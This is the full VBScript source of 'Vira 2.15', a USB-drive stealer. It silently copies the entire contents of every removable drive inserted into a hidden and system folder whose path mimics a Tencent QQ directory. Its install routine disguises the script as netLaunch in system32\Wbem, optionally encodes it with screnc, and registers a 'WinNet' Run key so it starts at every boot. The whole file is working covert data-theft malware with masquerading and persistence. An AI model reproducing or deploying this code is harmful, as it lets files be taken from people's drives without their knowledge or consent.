'Version 2.15 Ultimate
Option Explicit
On Error Resume Next
Const ViraVersion = "2.15"

Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination
Dim Container, IsCopied(23)
Dim Shell, Fso, Fin, Fout
Set Shell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

'********************
' Customize Section
'********************

FlagFileNum = 2
FlagFile = Array("Setup.exe", "bootmgr")

MaxCapacityGB = 32
Destination = "D:\Program Files\Tencent\QQMaster\" 'Must end with a backslash [\]

'***************************
' End of Customize Section
'***************************

If Wsh.Arguments.Count = 0 Then
  ProcessMain
Else
  Dim i, str
  For i = 0 To Wsh.Arguments.Count - 1
    str = LCase(Wsh.Arguments(i))
    If Chr(Asc(str)) = "/" Or Chr(Asc(str)) = "-" Then
      str = Mid(str, 2, Len(str)-1)
      Select Case str
        Case Else
          MsgBox "Unknown switch """ & Wsh.Arguments(i) & """", 16, "Vira " & ViraVersion & " Error"
          Wsh.Quit -1
      End Select
    Else
      Select Case str
        Case "help"
          MsgBox "XWH loves YZ.", 0, "Help"
          Wsh.Quit 0
        Case "execute"
          ProcessMain
        Case "install"
          InstallLocal
        Case "uninst"
          UninstLocal
        Case "uninstall"
          UninstLocal
        Case Else
          MsgBox "Unknown parameter """ & str & """", 16, "Vira " & ViraVersion & " Error"
          Wsh.Quit -1
      End Select
    End If
  Next
End If

Public Sub ProcessMain
  ViraInitialize
  Do
    ViraMain
    Wsh.Sleep 1000
  Loop
End Sub

'*************************
' Vira Process Functions
'*************************

Public Sub ViraInitialize()
  Dim i
  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
  Set Container = Fso.GetFolder(Destination)
  Container.Attributes = 7
  For i = 0 To 22
    IsCopied(i) = False
  Next
End Sub

Public Sub ViraMain()
  Dim DriveLetter, DriveReady, UDrive, i
  For i = 0 To 22
    DriveLetter = Chr(68 + i)
    DriveReady = False
    
    If Fso.DriveExists(DriveLetter) Then
      Set UDrive = Fso.GetDrive(DriveLetter)
      If UDrive.DriveType = 1 And Not IsCopied(i) Then
        IsCopied(i) = ProcessDrive(DriveLetter)
      End If
    Else
      IsCopied(i) = False
    End If
  Next
End Sub

Public Function ProcessDrive(DriveLetter)
  ProcessDrive = False
  Dim Target, UDrive
  Set UDrive = Fso.GetDrive(DriveLetter)
  Do
    Wsh.Sleep 500
  Loop Until UDrive.IsReady
  Target = Destination & Hex(UDrive.SerialNumber)
  If Fso.FolderExists(Target) Or Container.Size <= MaxCapacityGB*100000000 Then
    Dim i, FileCheck
    FileCheck = True
    For i = 0 to FlagFileNum - 1
      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
        FileCheck = False
        Exit For
      End If
    Next
    
    If FileCheck Then 'Copy this drive
      CopyDrive DriveLetter
      ProcessDrive = True
     End If
  End If
End Function

Public Sub CopyDrive(DriveLetter)
  Dim Fout, UDrive, Target
  Set UDrive = Fso.GetDrive(DriveLetter)
  'Generate Disk Info
  Target = Destination & Hex(UDrive.SerialNumber) & "\"
  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
  Set Fout = Fso.OpenTextFile(Target & "Vira.ini", 2, True, 0)
  Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
  Fout.WriteLine "[Drive]"
  Fout.WriteLine "SerialNumber=" & Hex(UDrive.SerialNumber)
  Fout.WriteLine "VolumeName=" & UDrive.VolumeName
  Fout.WriteLine "FileSystem=" & UDrive.FileSystem
  Fout.WriteLine "TotalSpace=" & UDrive.TotalSize
  Fout.WriteLine "FreeSpace=" & UDrive.FreeSpace
  Fout.Close
  Set Fout = Nothing
  Set UDrive = Nothing
  
  Fso.CopyFile DriveLetter & ":\*", Target, True
  Fso.CopyFolder DriveLetter & ":\*", Target, True
End Sub

'***********************
Public Sub InstallLocal()
  If Not AdminTest() Then
    MsgBox "Installation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
    Wsh.Quit 1
  End If
  Dim TempString
  TempString = Fso.GetParentFolderName(Wsh.ScriptFullName) & "\vtemp.vbe"
  EndProcess "netLaunch.exe"
  If Fso.FileExists("screnc.exe") Then
    Shell.Run "screnc.exe /s """ & Wsh.ScriptFullName & """ """ & TempString & """"
    Fso.CopyFile TempString, "C:\Windows\system32\Wbem\netLaunch.vbe", True
    Fso.DeleteFile TempString, True
  Else
    Fso.CopyFile Wsh.ScriptFullName, "C:\Windows\system32\Wbem\netLaunch.vbe", True
  End If
  Fso.CopyFile Wsh.FullName, "C:\Windows\system32\Wbem\netLaunch.exe", True
  
  TempString = "C:\Windows\system32\Wbem\netLaunch.exe C:\Windows\system32\Wbem\netLaunch.vbe"
  Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet", _
          TempString, "REG_SZ"
  Shell.Run TempString, 0, False
  MsgBox "Installation Complete!", 64, "Vira " & ViraVersion
  Wsh.Quit 0
End Sub

Public Sub UninstLocal()
  If Not AdminTest() Then
    MsgBox "Uninstallation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
    Wsh.Quit 1
  End If
  EndProcess "netLaunch.exe"
  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.exe", True
  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.vbe", True
  Shell.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet"
  MsgBox "Uninstallation Complete!", 64, "Vira " & ViraVersion
  Wsh.Quit 0
End Sub

Public Function AdminTest()
  On Error Resume Next
  Dim TestDir
  TestDir = "C:\Windows\AdminTest\"
  Fso.CreateFolder TestDir
  Wsh.Sleep 1000
  AdminTest = Fso.FolderExists(TestDir)
  If AdminTest Then
    Fso.DeleteFolder TestDir
  End If
End Function

Public Sub EndProcess(ProcessName)
  On Error Resume Next
  Shell.Run "TASKKILL.EXE /F /FI ""IMAGENAME eq " & ProcessName & """", 0, True
  Exit Sub
  Dim Wmi, Procs, Proc
  Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
  Set Procs = Wmi.ExecQuery("select * from win32_process where name='" & ProcessName & "'")
  For Each Proc In Procs 
    Proc.Terminate 
  Next
End Sub

